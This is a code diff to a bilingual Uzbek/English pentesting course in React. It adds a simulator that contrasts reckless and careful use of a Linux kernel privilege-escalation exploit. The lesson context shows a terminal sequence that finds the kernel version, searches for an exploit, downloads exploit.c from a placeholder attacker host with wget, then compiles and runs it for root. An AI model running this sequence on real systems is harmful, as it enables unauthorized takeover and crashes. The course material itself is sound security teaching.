@@ -1588,6 +1588,46 @@ function AutoToolVerifySim(){
       React.createElement("button",{onClick:()=>{setRun("cross");setStep(-1);},style:{flex:1,padding:"9px",background:run==="cross"?A+"22":SL2,color:run==="cross"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ikkinchi vosita bilan tekshirish","✅ Cross-check with a second tool"))));
 }
 
+function KernelExploitRiskSim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const RECKLESS=[
+    {col:BL,uz:"uname -r → 3.13.0-24-generic — mos exploit topildi, darhol yuklab ishga tushiriladi",en:"uname -r → 3.13.0-24-generic — a matching exploit found, downloaded and run immediately",duz:"Versiya to'g'ri topildi — muammo shu yerdan boshlanmaydi.",den:"The version is found correctly — the problem doesn't start here."},
+    {col:AM,uz:"Exploit kodi o'qilmadi — «nomiga qarab ishonch bildirildi»",en:"The exploit code isn't read — «trusted by name alone»",duz:"L23 dagi ogohlantirish bu yerda ham amal qiladi.",den:"The L23 warning applies here too."},
+    {col:AM,uz:"Exploit yadro xotirasida beqaror holat yaratadi — bu MIJOZNING PRODUKSIYA serveri",en:"The exploit creates an unstable kernel state — this is the CLIENT'S PRODUCTION server",duz:"Kernel exploitlar, ishlamasa ham, yadro holatini buzishi mumkin.",den:"Kernel exploits can corrupt kernel state even when they don't fully succeed."},
+    {col:D,uz:"💥 Server qulab tushdi — mijozning jonli xizmati soatlab to'xtab qoldi",en:"💥 The server crashes — the client's live service is down for hours",duz:"Root olish o'rniga, endi tiklash (recovery) suhbati boshlanadi.",den:"Instead of gaining root, now a recovery conversation begins.",final:true,bad:true}
+  ];
+  const CAREFUL=[
+    {col:BL,uz:"uname -r → xuddi shu 3.13.0-24-generic — mos exploit topildi",en:"uname -r → the exact same 3.13.0-24-generic — a matching exploit found",duz:"Bir xil boshlang'ich nuqta, boshqacha davomi.",den:"The same starting point, a different continuation."},
+    {col:AM,uz:"Exploit kodi avval o'qiladi — nima o'zgartirishi va qanday ishlashi tushuniladi",en:"The exploit code is read first — what it changes and how it works is understood",duz:"§4 dagi «ishga tushirishdan OLDIN tushuning» maslahatiga amal qilinadi.",den:"Following §4's advice to understand it BEFORE running it."},
+    {col:AM,uz:"Avval bir xil versiyali alohida test VM'da sinaladi — muvaffaqiyatli, vaqtincha sekinlashuv bilan",en:"It's first tested on a separate VM with the identical version — succeeds, with a brief slowdown",duz:"Haqiqiy nishonga tegishdan oldin xavf o'lchab ko'riladi.",den:"The risk is measured before ever touching the real target."},
+    {col:A,uz:"✅ Mijoz bilan xavf muhokama qilingach, nazorat ostida ishga tushiriladi — root, uzilish yo'q",en:"✅ Run under control after discussing the risk with the client — root, no downtime",duz:"Xuddi shu exploit, xuddi shu natija — lekin boshqariladigan tarzda.",den:"The exact same exploit, the exact same result — but delivered under control.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="reckless"?RECKLESS:CAREFUL;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="reckless"?RECKLESS:run==="careful"?CAREFUL:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu kernel exploit'ni beparvo va ehtiyotkor tarzda ishga tushirishni solishtiring.","⬇ Pick a scenario — compare running the exact same kernel exploit recklessly versus carefully.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="reckless"?t(lang,"✗ Beparvo: root o'rniga qulash","✗ Reckless: a crash instead of root"):t(lang,"✓ Ehtiyotkor: root, xizmat buzilmadi","✓ Careful: root, no service disruption")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("reckless");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reckless"?D+"22":SL2,color:run==="reckless"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"💥 Beparvo (sinovsiz)","💥 Reckless (untested)")),
+      React.createElement("button",{onClick:()=>{setRun("careful");setStep(-1);},style:{flex:1,padding:"9px",background:run==="careful"?A+"22":SL2,color:run==="careful"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ehtiyotkor (avval sinash)","✅ Careful (test first)"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -3069,7 +3109,10 @@ function LessonL34(){
     React.createElement(Terminal,null,"# Yadro versiyasini aniqlash\nuname -r          # masalan: 3.13.0-24-generic\ncat /proc/version\n\n# Mos exploit qidirish\nsearchsploit linux kernel 3.13\n\n# Nishonga uzatish, kompilyatsiya va ishga tushirish\nwget http://<HUJUM-IP>:8000/exploit.c\ngcc exploit.c -o exploit\n./exploit\n# id  →  uid=0(root) bo'lsa, muvaffaqiyat"),
     React.createElement(H2,{num:"§4"},t(lang,"Ehtiyotkorlik","Caution")),
     React.createElement(P,null,t(lang,"Kernel exploit — eng xavfli privesc usuli. Muvaffaqiyatsiz urinish tizimni buzishi (crash) yoki qayta ishga tushishga majburlashi mumkin. Exploit kodini ishga tushirishdan OLDIN uning qanday ishlashini tushuning: ba'zi kodlar tizimga qaytarib bo'lmaydigan o'zgarishlar kiritadi. Laboratoriya yoki CTF'da bu unchalik muammo emas, lekin real pentestda tizim yaxlitligini buzish mutlaqo qabul qilinmaydi — avval mijoz bilan bu xavfni kelishib oling.","Kernel exploits are the most dangerous privesc method. A failed attempt can crash the system or force a reboot. BEFORE running exploit code, understand how it works: some code makes irreversible changes to the system. In a lab or CTF this matters less, but in a real pentest breaking system integrity is absolutely unacceptable — agree this risk with the client first.")),
-    eth("Kernel exploitlar tizimni ishdan chiqarishi mumkin. Ularni faqat o'z laboratoriyangizda yoki mijoz yozma ravishda ruxsat bergan holatdagina ishga tushiring.","Kernel exploits can take a system down. Only run them in your own lab, or where the client has given explicit written authorization."),
+React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: beparvo vs ehtiyotkor","Interactive simulator: reckless vs careful")),
+    React.createElement(P,null,t(lang,"§4 dagi xavfni his qiling — xuddi shu kernel exploit'ni ikki yondashuv bilan sinang:","Feel the §4 risk for yourself — try the exact same kernel exploit two different ways:")),
+    React.createElement(KernelExploitRiskSim),
+        eth("Kernel exploitlar tizimni ishdan chiqarishi mumkin. Ularni faqat o'z laboratoriyangizda yoki mijoz yozma ravishda ruxsat bergan holatdagina ishga tushiring.","Kernel exploits can take a system down. Only run them in your own lab, or where the client has given explicit written authorization."),
     React.createElement(Quiz,{q:{uz:"Nega muvaffaqiyatli kernel exploit root beradi?",en:"Why does a successful kernel exploit yield root?"},opts:[{uz:"Chunki yadro allaqachon eng yuqori (root) imtiyoz darajasida ishlaydi",en:"Because the kernel already runs at the highest (root) privilege level"},{uz:"Chunki u internetni o'chiradi",en:"Because it turns off the internet"},{uz:"Chunki u parolni o'g'irlaydi",en:"Because it steals the password"},{uz:"Chunki u antivirusni yoqadi",en:"Because it enables the antivirus"}],correct:0,exp:{uz:"Yadro tizimning markaziy, eng imtiyozli qismidir; undagi zaiflikdan foydalanish kodni yadro (root) darajasida bajarishga imkon beradi.",en:"The kernel is the central, most privileged part of the system; exploiting a flaw in it lets you run code at kernel (root) level."}}));
 }
 function LessonL35(){
